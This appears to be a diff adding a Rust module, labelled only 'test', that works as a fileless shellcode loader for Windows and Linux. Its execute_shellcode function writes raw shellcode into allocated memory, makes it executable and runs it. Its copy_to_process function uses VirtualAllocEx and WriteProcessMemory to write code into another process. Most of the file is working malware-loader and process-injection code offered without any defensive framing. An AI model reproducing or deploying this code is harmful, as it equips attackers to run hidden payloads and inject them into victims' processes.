@@ -1,0 +1,643 @@
+///test
+
+use std::collections::HashMap;
+use std::sync::{Arc, Mutex};
+
+#[cfg(target_os = "windows")]
+use winapi::um::memoryapi;
+#[cfg(target_os = "windows")]
+use winapi::um::winnt;
+
+#[cfg(target_os = "linux")]
+use libc;
+
+/// Memory protection level
+pub enum MemoryProtection {
+    /// Read only
+    ReadOnly,
+    /// Read and write
+    ReadWrite,
+    /// Read and execute
+    ReadExecute,
+    /// Read, write, and execute
+    ReadWriteExecute,
+}
+
+/// Memory allocation type
+pub enum MemoryAllocationType {
+    /// Private memory
+    Private,
+    /// Shared memory
+    Shared,
+    /// Large pages
+    LargePages,
+}
+
+/// Memory region
+pub struct MemoryRegion {
+    /// Base address
+    pub address: *mut u8,
+    /// Size in bytes
+    pub size: usize,
+    /// Memory protection
+    pub protection: MemoryProtection,
+    /// Allocation type
+    pub allocation_type: MemoryAllocationType,
+    /// Content hash (for integrity verification)
+    pub content_hash: String,
+}
+
+/// Function pointer type for shellcode
+pub type ShellcodeFunction = unsafe extern "C" fn() -> i32;
+
+/// Memory only execution manager
+pub struct MemoryManager {
+    /// Allocated memory regions
+    pub regions: Arc<Mutex<HashMap<String, MemoryRegion>>>,
+    /// Executable code pages
+    pub executables: Arc<Mutex<HashMap<String, ShellcodeFunction>>>,
+}
+
+impl MemoryProtection {
+    /// Convert to platform-specific memory protection flags
+    #[cfg(target_os = "windows")]
+    pub fn to_native(&self) -> u32 {
+        match self {
+            Self::ReadOnly => winnt::PAGE_READONLY,
+            Self::ReadWrite => winnt::PAGE_READWRITE,
+            Self::ReadExecute => winnt::PAGE_EXECUTE_READ,
+            Self::ReadWriteExecute => winnt::PAGE_EXECUTE_READWRITE,
+        }
+    }
+    
+    #[cfg(target_os = "linux")]
+    pub fn to_native(&self) -> i32 {
+        match self {
+            Self::ReadOnly => libc::PROT_READ,
+            Self::ReadWrite => libc::PROT_READ | libc::PROT_WRITE,
+            Self::ReadExecute => libc::PROT_READ | libc::PROT_EXEC,
+            Self::ReadWriteExecute => libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
+        }
+    }
+}
+
+impl MemoryAllocationType {
+    /// Convert to platform-specific allocation flags
+    #[cfg(target_os = "windows")]
+    pub fn to_native(&self) -> u32 {
+        match self {
+            Self::Private => winnt::MEM_COMMIT | winnt::MEM_RESERVE,
+            Self::Shared => winnt::MEM_COMMIT | winnt::MEM_RESERVE,
+            Self::LargePages => winnt::MEM_COMMIT | winnt::MEM_RESERVE | winnt::MEM_LARGE_PAGES,
+        }
+    }
+    
+    #[cfg(target_os = "linux")]
+    pub fn to_native(&self) -> i32 {
+        match self {
+            Self::Private => libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
+            Self::Shared => libc::MAP_SHARED | libc::MAP_ANONYMOUS,
+            Self::LargePages => libc::MAP_PRIVATE | libc::MAP_ANONYMOUS, // Linux doesn't have direct large pages flag for mmap
+        }
+    }
+}
+
+impl MemoryManager {
+    /// Create a new memory manager
+    pub fn new() -> Self {
+        Self {
+            regions: Arc::new(Mutex::new(HashMap::new())),
+            executables: Arc::new(Mutex::new(HashMap::new())),
+        }
+    }
+    
+    /// Allocate a new memory region
+    pub fn allocate(&self, name: &str, size: usize, protection: MemoryProtection, allocation_type: MemoryAllocationType) -> Result<*mut u8, String> {
+        unsafe {
+            let address: *mut u8;
+            
+            #[cfg(target_os = "windows")]
+            {
+                address = memoryapi::VirtualAlloc(
+                    std::ptr::null_mut(),
+                    size,
+                    allocation_type.to_native(),
+                    protection.to_native(),
+                ) as *mut u8;
+                
+                if address.is_null() {
+                    return Err("Failed to allocate memory".to_string());
+                }
+            }
+            
+            #[cfg(target_os = "linux")]
+            {
+                address = libc::mmap(
+                    std::ptr::null_mut(),
+                    size,
+                    protection.to_native(),
+                    allocation_type.to_native(),
+                    -1,
+                    0,
+                ) as *mut u8;
+                
+                if address == libc::MAP_FAILED as *mut u8 {
+                    return Err("Failed to allocate memory".to_string());
+                }
+            }
+            
+            // Hash is calculated after content is written
+            let region = MemoryRegion {
+                address,
+                size,
+                protection,
+                allocation_type,
+                content_hash: String::new(),
+            };
+            
+            let mut regions = self.regions.lock().unwrap();
+            regions.insert(name.to_string(), region);
+            
+            Ok(address)
+        }
+    }
+    
+    /// Free a memory region
+    pub fn free(&self, name: &str) -> Result<(), String> {
+        let mut regions = self.regions.lock().unwrap();
+        
+        if let Some(region) = regions.remove(name) {
+            unsafe {
+                #[cfg(target_os = "windows")]
+                {
+                    let result = memoryapi::VirtualFree(
+                        region.address as *mut _,
+                        0,
+                        winnt::MEM_RELEASE,
+                    );
+                    
+                    if result == 0 {
+                        return Err("Failed to free memory".to_string());
+                    }
+                }
+                
+                #[cfg(target_os = "linux")]
+                {
+                    let result = libc::munmap(
+                        region.address as *mut _,
+                        region.size,
+                    );
+                    
+                    if result != 0 {
+                        return Err("Failed to free memory".to_string());
+                    }
+                }
+            }
+            
+            // Also remove from executables if present
+            let mut executables = self.executables.lock().unwrap();
+            executables.remove(name);
+            
+            Ok(())
+        } else {
+            Err(format!("Memory region '{}' not found", name))
+        }
+    }
+    
+    /// Write data to a memory region
+    pub fn write(&self, name: &str, data: &[u8]) -> Result<(), String> {
+        let mut regions = self.regions.lock().unwrap();
+        
+        if let Some(region) = regions.get_mut(name) {
+            if data.len() > region.size {
+                return Err("Data is larger than allocated memory region".to_string());
+            }
+            
+            unsafe {
+                std::ptr::copy_nonoverlapping(
+                    data.as_ptr(),
+                    region.address,
+                    data.len(),
+                );
+            }
+            
+            // Calculate hash of content for integrity verification
+            use std::collections::hash_map::DefaultHasher;
+            use std::hash::{Hash, Hasher};
+            
+            let mut hasher = DefaultHasher::new();
+            data.hash(&mut hasher);
+            region.content_hash = format!("{:x}", hasher.finish());
+            
+            Ok(())
+        } else {
+            Err(format!("Memory region '{}' not found", name))
+        }
+    }
+    
+    /// Read data from a memory region
+    pub fn read(&self, name: &str) -> Result<Vec<u8>, String> {
+        let regions = self.regions.lock().unwrap();
+        
+        if let Some(region) = regions.get(name) {
+            let mut data = vec![0u8; region.size];
+            
+            unsafe {
+                std::ptr::copy_nonoverlapping(
+                    region.address,
+                    data.as_mut_ptr(),
+                    region.size,
+                );
+            }
+            
+            Ok(data)
+        } else {
+            Err(format!("Memory region '{}' not found", name))
+        }
+    }
+    
+    /// Change memory protection
+    pub fn protect(&self, name: &str, protection: MemoryProtection) -> Result<(), String> {
+        let mut regions = self.regions.lock().unwrap();
+        
+        if let Some(region) = regions.get_mut(name) {
+            unsafe {
+                #[cfg(target_os = "windows")]
+                {
+                    let mut old_protect = 0;
+                    let result = winapi::um::memoryapi::VirtualProtect(
+                        region.address as *mut _,
+                        region.size,
+                        protection.to_native(),
+                        &mut old_protect,
+                    );
+                    
+                    if result == 0 {
+                        return Err("Failed to change memory protection".to_string());
+                    }
+                }
+                
+                #[cfg(target_os = "linux")]
+                {
+                    let result = libc::mprotect(
+                        region.address as *mut _,
+                        region.size,
+                        protection.to_native(),
+                    );
+                    
+                    if result != 0 {
+                        return Err("Failed to change memory protection".to_string());
+                    }
+                }
+            }
+            
+            // Update protection
+            region.protection = protection;
+            
+            Ok(())
+        } else {
+            Err(format!("Memory region '{}' not found", name))
+        }
+    }
+    
+    /// Prepare and execute shellcode
+    pub fn execute_shellcode(&self, name: &str, shellcode: &[u8]) -> Result<i32, String> {
+        // First allocate memory with RW protection
+        let address = self.allocate(
+            name,
+            shellcode.len(),
+            MemoryProtection::ReadWrite,
+            MemoryAllocationType::Private,
+        )?;
+        
+        // Write shellcode to memory
+        self.write(name, shellcode)?;
+        
+        // Change protection to RX
+        self.protect(name, MemoryProtection::ReadExecute)?;
+        
+        // Create function pointer
+        let function: ShellcodeFunction;
+        unsafe {
+            function = std::mem::transmute(address);
+        }
+        
+        // Store function pointer
+        let mut executables = self.executables.lock().unwrap();
+        executables.insert(name.to_string(), function);
+        
+        // Execute shellcode
+        let result;
+        unsafe {
+            result = function();
+        }
+        
+        Ok(result)
+    }
+    
+    /// Execute previously loaded shellcode
+    pub fn execute(&self, name: &str) -> Result<i32, String> {
+        let executables = self.executables.lock().unwrap();
+        
+        if let Some(function) = executables.get(name) {
+            let result;
+            unsafe {
+                result = function();
+            }
+            
+            Ok(result)
+        } else {
+            Err(format!("Executable '{}' not found", name))
+        }
+    }
+    
+    /// Copy memory region to another process
+    #[cfg(target_os = "windows")]
+    pub fn copy_to_process(&self, name: &str, process_handle: winapi::um::winnt::HANDLE) -> Result<*mut u8, String> {
+        let regions = self.regions.lock().unwrap();
+        
+        if let Some(region) = regions.get(name) {
+            unsafe {
+                // Allocate memory in target process
+                let remote_address = memoryapi::VirtualAllocEx(
+                    process_handle,
+                    std::ptr::null_mut(),
+                    region.size,
+                    region.allocation_type.to_native(),
+                    region.protection.to_native(),
+                );
+                
+                if remote_address.is_null() {
+                    return Err("Failed to allocate memory in target process".to_string());
+                }
+                
+                // Write memory to target process
+                let mut bytes_written = 0;
+                let write_result = memoryapi::WriteProcessMemory(
+                    process_handle,
+                    remote_address,
+                    region.address as *const _,
+                    region.size,
+                    &mut bytes_written,
+                );
+                
+                if write_result == 0 || bytes_written != region.size {
+                    return Err("Failed to write memory to target process".to_string());
+                }
+                
+                Ok(remote_address as *mut u8)
+            }
+        } else {
+            Err(format!("Memory region '{}' not found", name))
+        }
+    }
+    
+    /// Create memory-mapped file
+    pub fn create_memory_mapped_file(&self, name: &str, file_path: &str, size: usize, writable: bool) -> Result<*mut u8, String> {
+        unsafe {
+            #[cfg(target_os = "windows")]
+            {
+                use std::ffi::CString;
+                use winapi::um::fileapi;
+                use winapi::um::winbase;
+                
+                // Convert path to CString
+                let path_cstr = match CString::new(file_path) {
+                    Ok(cstr) => cstr,
+                    Err(_) => return Err("Invalid file path".to_string()),
+                };
+                
+                // Open or create file
+                let file_handle = fileapi::CreateFileA(
+                    path_cstr.as_ptr() as *const _,
+                    if writable { winnt::GENERIC_READ | winnt::GENERIC_WRITE } else { winnt::GENERIC_READ },
+                    winnt::FILE_SHARE_READ,
+                    std::ptr::null_mut(),
+                    if writable { fileapi::OPEN_ALWAYS } else { fileapi::OPEN_EXISTING },
+                    winnt::FILE_ATTRIBUTE_NORMAL,
+                    std::ptr::null_mut(),
+                );
+                
+                if file_handle == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+                    return Err("Failed to open file".to_string());
+                }
+                
+                // Create file mapping
+                let mapping_handle = winapi::um::memoryapi::CreateFileMappingA(
+                    file_handle,
+                    std::ptr::null_mut(),
+                    if writable { winnt::PAGE_READWRITE } else { winnt::PAGE_READONLY },
+                    ((size as u64) >> 32) as u32,
+                    (size as u32),
+                    std::ptr::null(),
+                );
+                
+                // Close file handle (mapping keeps it open)
+                winapi::um::handleapi::CloseHandle(file_handle);
+                
+                if mapping_handle.is_null() {
+                    return Err("Failed to create file mapping".to_string());
+                }
+                
+                // Map view of file
+                let address = winapi::um::memoryapi::MapViewOfFile(
+                    mapping_handle,
+                    if writable { winnt::FILE_MAP_WRITE } else { winnt::FILE_MAP_READ },
+                    0,
+                    0,
+                    size,
+                ) as *mut u8;
+                
+                // Close mapping handle (view keeps it open)
+                winapi::um::handleapi::CloseHandle(mapping_handle);
+                
+                if address.is_null() {
+                    return Err("Failed to map view of file".to_string());
+                }
+                
+                // Create memory region
+                let region = MemoryRegion {
+                    address,
+                    size,
+                    protection: if writable { MemoryProtection::ReadWrite } else { MemoryProtection::ReadOnly },
+                    allocation_type: MemoryAllocationType::Shared,
+                    content_hash: String::new(),
+                };
+                
+                let mut regions = self.regions.lock().unwrap();
+                regions.insert(name.to_string(), region);
+                
+                Ok(address)
+            }
+            
+            #[cfg(target_os = "linux")]
+            {
+                use std::ffi::CString;
+                
+                // Convert path to CString
+                let path_cstr = match CString::new(file_path) {
+                    Ok(cstr) => cstr,
+                    Err(_) => return Err("Invalid file path".to_string()),
+                };
+                
+                // Open file
+                let flags = if writable { libc::O_RDWR | libc::O_CREAT } else { libc::O_RDONLY };
+                let fd = libc::open(path_cstr.as_ptr(), flags, 0o666);
+                
+                if fd == -1 {
+                    return Err("Failed to open file".to_string());
+                }
+                
+                // If file is to be created/extended, set its size
+                if writable && size > 0 {
+                    let result = libc::ftruncate(fd, size as i64);
+                    if result == -1 {
+                        libc::close(fd);
+                        return Err("Failed to set file size".to_string());
+                    }
+                }
+                
+                // Map file to memory
+                let prot = if writable { libc::PROT_READ | libc::PROT_WRITE } else { libc::PROT_READ };
+                let flags = libc::MAP_SHARED;
+                
+                let address = libc::mmap(
+                    std::ptr::null_mut(),
+                    size,
+                    prot,
+                    flags,
+                    fd,
+                    0,
+                ) as *mut u8;
+                
+                // Close file descriptor (mapping keeps it open)
+                libc::close(fd);
+                
+                if address == libc::MAP_FAILED as *mut u8 {
+                    return Err("Failed to map file to memory".to_string());
+                }
+                
+                // Create memory region
+                let region = MemoryRegion {
+                    address,
+                    size,
+                    protection: if writable { MemoryProtection::ReadWrite } else { MemoryProtection::ReadOnly },
+                    allocation_type: MemoryAllocationType::Shared,
+                    content_hash: String::new(),
+                };
+                
+                let mut regions = self.regions.lock().unwrap();
+                regions.insert(name.to_string(), region);
+                
+                Ok(address)
+            }
+        }
+    }
+    
+    /// Create anonymous shared memory
+    pub fn create_shared_memory(&self, name: &str, size: usize) -> Result<*mut u8, String> {
+        unsafe {
+            let address: *mut u8;
+            
+            #[cfg(target_os = "windows")]
+            {
+                // Create file mapping in pagefile
+                let mapping_handle = winapi::um::memoryapi::CreateFileMappingA(
+                    winapi::um::handleapi::INVALID_HANDLE_VALUE,
+                    std::ptr::null_mut(),
+                    winnt::PAGE_READWRITE,
+                    ((size as u64) >> 32) as u32,
+                    (size as u32),
+                    std::ptr::null(),
+                );
+                
+                if mapping_handle.is_null() {
+                    return Err("Failed to create file mapping".to_string());
+                }
+                
+                // Map view of file
+                address = winapi::um::memoryapi::MapViewOfFile(
+                    mapping_handle,
+                    winnt::FILE_MAP_ALL_ACCESS,
+                    0,
+                    0,
+                    size,
+                ) as *mut u8;
+                
+                // Close mapping handle (view keeps it open)
+                winapi::um::handleapi::CloseHandle(mapping_handle);
+                
+                if address.is_null() {
+                    return Err("Failed to map view of file".to_string());
+                }
+            }
+            
+            #[cfg(target_os = "linux")]
+            {
+                // Create shared memory with mmap
+                address = libc::mmap(
+                    std::ptr::null_mut(),
+                    size,
+                    libc::PROT_READ | libc::PROT_WRITE,
+                    libc::MAP_SHARED | libc::MAP_ANONYMOUS,
+                    -1,
+                    0,
+                ) as *mut u8;
+                
+                if address == libc::MAP_FAILED as *mut u8 {
+                    return Err("Failed to create shared memory".to_string());
+                }
+            }
+            
+            // Create memory region
+            let region = MemoryRegion {
+                address,
+                size,
+                protection: MemoryProtection::ReadWrite,
+                allocation_type: MemoryAllocationType::Shared,
+                content_hash: String::new(),
+            };
+            
+            let mut regions = self.regions.lock().unwrap();
+            regions.insert(name.to_string(), region);
+            
+            Ok(address)
+        }
+    }
+    
+    /// Clean up all allocated memory
+    pub fn cleanup(&self) -> Result<(), String> {
+        let mut regions = self.regions.lock().unwrap();
+        let region_names: Vec<String> = regions.keys().cloned().collect();
+        
+        for name in region_names {
+            if let Some(region) = regions.remove(&name) {
+                unsafe {
+                    #[cfg(target_os = "windows")]
+                    {
+                        let _ = memoryapi::VirtualFree(
+                            region.address as *mut _,
+                            0,
+                            winnt::MEM_RELEASE,
+                        );
+                    }
+                    
+                    #[cfg(target_os = "linux")]
+                    {
+                        let _ = libc::munmap(
+                            region.address as *mut _,
+                            region.size,
+                        );
+                    }
+                }
+            }
+        }
+        
+        regions.clear();
+        
+        let mut executables = self.executables.lock().unwrap();
+        executables.clear();
+        
+        Ok(())
+    }
+}
